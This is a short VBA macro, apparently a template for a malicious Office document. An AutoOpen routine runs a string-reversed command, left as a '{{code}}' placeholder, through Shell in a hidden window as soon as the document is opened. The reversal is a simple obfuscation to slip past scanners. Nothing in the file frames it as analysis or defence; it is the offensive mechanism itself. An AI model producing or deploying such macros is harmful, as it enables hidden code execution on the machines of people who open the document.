Function ver(cows)
    ver = StrReverse(cows)
End Function

Sub MyMacro()
    Dim str As String
    str = ver("{{code}}")
    Shell str, vbHide
End Sub

Sub AutoOpen()
    MyMacro
End Sub